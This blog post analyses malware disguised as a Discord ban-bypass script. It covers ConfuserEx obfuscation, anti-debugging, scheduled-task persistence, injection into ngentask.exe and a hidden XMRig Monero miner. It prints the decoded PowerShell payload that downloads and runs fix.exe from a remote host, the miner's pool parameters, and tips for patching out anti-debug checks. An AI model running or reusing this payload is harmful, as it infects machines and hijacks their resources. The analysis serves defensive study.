---
layout: post
title: Unmasking Discord Phantom Miner - Analyzing a Discord Ban Bypass Malware
lang: en
categories: [Malware, Reverse-Engineering]
tags: [windows, malware, .NET, miner, reversing, confuserEx, confuser, obfuscation]
permalink: /posts/2024-10-11-discord-phantom-miner
---

![discord_malw.webp]({{ site.baseurl }}/images/discord_malware/discord_malw.webp)

## Introduction

Recently, a Telegram user by the handle [@belka_e](https://t.me/poxek_chat/118296) shared a screenshot in the [poxek](https://t.me/poxek_chat) chat, which drew attention to a suspicious script. This script claimed to bypass Discord bans in Russia. However, upon closer inspection, it was found that the software was downloading and executing a payload in memory.

The download was from the address:

```
ayugram.temp.swtest.ru/install.ps1
```

![e8a560256efa7d9cf9a04af6ce5bf0f8.png]({{ site.baseurl }}/images/discord_malware/e8a560256efa7d9cf9a04af6ce5bf0f8.png)

This PowerShell script file contained a Base64-encoded payload. Upon decoding, the actual malicious payload was revealed.

![752c84e53b7d8b8bd093f312b5668355.png]({{ site.baseurl }}/images/discord_malware/752c84e53b7d8b8bd093f312b5668355.png)

---

## Technical Analysis

### Decoded Payload

```powershell
$username = $env:USERNAME
$url = "http://ayugram.temp.swtest.ru/fix"
$output = "C:\Users\$username\fix.exe"

Start-Sleep -Seconds 1
Invoke-WebRequest -Uri $url -OutFile $output
Start-Sleep -Seconds 5
Start-Process -FilePath $output
```

The payload downloads and executes a file named `fix.exe` from the remote server. Upon analysis, the file turned out to be a `.NET` binary obfuscated using ConfuserEx 1.0.0.

![ceda5ebbed4bfe3e98c6206e25d4d989.png]({{ site.baseurl }}/images/discord_malware/ceda5ebbed4bfe3e98c6206e25d4d989.png)

### Obfuscation: ConfuserEx 1.0.0

After determining that `fix.exe` was a .NET binary, I encountered significant challenges due to the obfuscation applied by **ConfuserEx 1.0.0**. Following the steps outlined in the [UnconfuserExTools Repository](https://github.com/landoncrabtree/UnconfuserExTools), I was able to deobfuscate the binary and begin analyzing its behavior.

![76b25feae49567b98b2a08413c6ea854.png]({{ site.baseurl }}/images/discord_malware/76b25feae49567b98b2a08413c6ea854.png)

### Anti-Debugging Techniques

The first part of the binary checks whether a debugger is attached or if certain debugging-related environment variables are set. In **dnSpy**, you can edit these instructions and fill them with `NOP` operations to bypass the anti-debugging measures.

![5689c290c0ede5d3fad23de5c8147818.png]({{ site.baseurl }}/images/discord_malware/5689c290c0ede5d3fad23de5c8147818.png)

### Dropping and Persistence Mechanism

The malware drops itself on disk in the following location:

```
C:\Users\<username>\AppData\Roaming\winupdater.exe
```

It then establishes persistence by creating a scheduled task using `schtasks` with the task name `MicrosoftEdgeUpdate`, which ensures the malware is run at regular intervals.

![1adc975fdee02118a4560166f7daa9f6.png]({{ site.baseurl }}/images/discord_malware/1adc975fdee02118a4560166f7daa9f6.png)

### XMRig Miner Payload

After establishing persistence, the malware extracts a payload from its resources: the **XMRig** cryptocurrency miner.

![e8f6f37c3fb149686a848103aee0d78f.png]({{ site.baseurl }}/images/discord_malware/e8f6f37c3fb149686a848103aee0d78f.png)

#### The behavior is as follows:

- **Process Monitoring**: Before starting the miner process, the malware checks if **Task Manager** or **Process Hacker** is running. If either is detected, the malware kills the miner process to avoid detection (in case the miner process is already running from previous infections).

![7243c8cd1b6bdd9ab049fea572434131.png]({{ site.baseurl }}/images/discord_malware/7243c8cd1b6bdd9ab049fea572434131.png)

- **Injection into ngentask.exe**: The malware starts the following process:
  ```
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe
  ```
  It then allocates memory within this process and decrypts the **XMRig** miner payload into the allocated space. 
  
  ![40c794eec3b017f2c870a6336c7c465c.png]({{ site.baseurl }}/images/discord_malware/40c794eec3b017f2c870a6336c7c465c.png)

- **Miner Execution**: The miner is started with the following parameters:
  ```
  --algo rx/0 --donate-level 0 --max-cpu-usage 25 -o mine.bmpool.org:6004 -u 7121405
  ```

This configuration allows the malware to mine **Monero (XMR)** at 25% CPU usage, directing the mined currency to the attacker's wallet.

![bad33f69ef42c6c9656150b9acf03819.png]({{ site.baseurl }}/images/discord_malware/bad33f69ef42c6c9656150b9acf03819.png)

---

## Conclusion

This investigation revealed that the malware not only establishes persistence via scheduled tasks but also uses several techniques to avoid detection:

- **Anti-debugging** measures are used to thwart reverse engineering.
- The malware uses stealthy persistence via the **MicrosoftEdgeUpdate** task.
- It deploys an **XMRig** cryptocurrency miner, which is injected into a .NET framework process to avoid detection and maximize stealth.
